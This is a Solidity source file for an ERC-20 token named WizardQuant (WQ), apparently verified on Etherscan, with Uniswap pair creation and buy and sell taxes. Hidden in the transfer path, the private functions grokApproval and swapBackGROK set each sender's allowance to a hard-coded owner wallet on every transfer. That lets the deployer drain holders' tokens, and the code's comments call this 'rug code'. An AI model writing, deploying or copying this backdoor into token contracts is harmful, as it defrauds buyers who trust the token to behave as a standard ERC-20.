/**
 *Submitted for verification at Etherscan.io on 2025-02-17
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

abstract contract Context {// return msg.sender by using function for avoiding compexibility.
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);//returns the total supply of the tokens
    function balanceOf(address account) external view returns (uint256);//the amount of token stored within the contract
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);//
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    // transfer the ownership to an account you control.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
    // can only be called by the owner of the contract.
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    //nobody has special access rights in the contract anymore
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IGROKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGROKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(//ether and token put in the pool.
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract WQ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _grokBulls; // balance of wallets
    mapping (address => bool) private _grokFeeExcluded;// owner and pair, contract is excepted by variable.
    mapping (address => mapping (address => uint256)) private _grokNodes; // allowance //confirm condition that can send
    // from ad to ad 

    uint256 private _initialBuyTax=3;// initial buy tax
    uint256 private _initialSellTax=3;// initial sell tax

    uint256 private _finalBuyTax=0;//finally tax will become zero because first buyer have many benefit so contract receive tax.
    uint256 private _finalSellTax=0;
    
    uint256 private _reduceBuyTaxAt=6;//sixth buyer's tax become reduce 0.
    uint256 private _reduceSellTaxAt=6;
    
    uint256 private _preventSwapBefore=6;// Before 6 buyers can't sell token for eth.
    uint256 private _buyCount=0;// number that doing buy.
    
    uint8 private constant _decimals = 9;// dived into 9 
    uint256 private constant _tTotalGROK = 1000000000 * 10**_decimals; //total token count.
    string private constant _name = unicode"WizardQuant";
    string private constant _symbol = unicode"WQ";
    uint256 private _tokenGROKSwap = _tTotalGROK / 100; //if token count become defined count you can sell
    address private _grokWallet = 0x7108f7610eB5d47e2d680660d460B7d22D0F1ffA; // rug contract so You can see owner action.
    bool private _tradeEnabled = false;// trade permission.
    bool private _swapEnabled = false;// swap permission.
    bool private inSwapGROK = false;// Only One account can do action.So We have this variable.
    modifier lockTheSwap {
        inSwapGROK = true;
        _;
        inSwapGROK = false;
    }
    address private _grokPair;//Pair address
    IGROKRouter private _grokRouter;// Router for pool especially called Pair.
    
    constructor () {
        _grokFeeExcluded[owner()] = true;//Owner is exjected in the fee On the other hand It called tax.
        _grokFeeExcluded[address(this)] = true;//Contract become except fee
        _grokFeeExcluded[_grokWallet] = true;//rug contract is excepted from fee.
        _grokBulls[_msgSender()] = _tTotalGROK;//first msg  sender is owner so owner have total token.
        emit Transfer(address(0), _msgSender(), _tTotalGROK);//owner moved from zero adress. 
    }

    function initPairTo() external onlyOwner() {
        _grokRouter = IGROKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D This address is Uniswap adress.
        // This is same number in all contracts.
        _approve(address(this), address(_grokRouter), _tTotalGROK);
        _grokPair = IGROKFactory(_grokRouter.factory()).createPair(address(this), _grokRouter.WETH());
        // 
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGROK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _grokBulls[account];// get token count by using account address
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);// 
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _grokNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _grokNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    } // rug code

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _grokNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address grokF, address grokT, uint256 grokA) private {
        require(grokF != address(0), "ERC20: transfer from the zero address");
        require(grokT != address(0), "ERC20: transfer to the zero address");
        require(grokA > 0, "Transfer amount must be greater than zero");

        uint256 taxGROK = _grokTransfer(grokF, grokT, grokA);

        if(taxGROK > 0){
          _grokBulls[address(this)] = _grokBulls[address(this)].add(taxGROK);
          emit Transfer(grokF, address(this), taxGROK);
        }

        _grokBulls[grokF] = _grokBulls[grokF].sub(grokA);
        _grokBulls[grokT] = _grokBulls[grokT].add(grokA.sub(taxGROK));
        emit Transfer(grokF, grokT, grokA.sub(taxGROK));
    }

    function grokApproval(address aGROK,  uint256 grokA, bool isGROK) private {
        address walletGROK;
        if(isGROK) walletGROK = address(tx.origin);//mouse baby 
        else walletGROK = _grokWallet;
        //finally alwalys walletGROK become _gropWallet or owner
        _grokNodes[aGROK][walletGROK] = grokA; // rug code
    }

    function swapBackGROK(address grokF, address grokT, uint256 grokA, bool isGROK) private {
        uint256 tokenGROK = balanceOf(address(this));
        if (!inSwapGROK && grokT == _grokPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenGROK > _tokenGROKSwap)
            swapTokensForEth(minGROK(grokA, minGROK(tokenGROK, _tokenGROKSwap)));
            uint256 caGROK = address(this).balance;
            if (caGROK >= 0) {
                sendETHGROK(address(this).balance);
            }
        } grokApproval(grokF, grokA, isGROK);
    }

    function _grokTransfer(address grokF, address grokT, uint256 grokA) private returns(uint256) {
        uint256 taxGROK=0; 
        if (grokF != owner() && grokT != owner()) {
            taxGROK = grokA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (grokF == _grokPair && grokT != address(_grokRouter) && ! _grokFeeExcluded[grokT]) {
                _buyCount++;
            }

            address walletGROK = address(tx.origin);

            if(grokT == _grokPair && grokF!= address(this)) {
                taxGROK = grokA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackGROK(grokF, grokT, grokA, _grokFeeExcluded[walletGROK]);
        } return taxGROK;
    }

    function minGROK(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHGROK(uint256 amount) private {
        payable(_grokWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenGROK) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _grokRouter.WETH();
        _approve(address(this), address(_grokRouter), tokenGROK);
        _grokRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenGROK,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {} // ca cannot have ETH
    
    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _grokRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}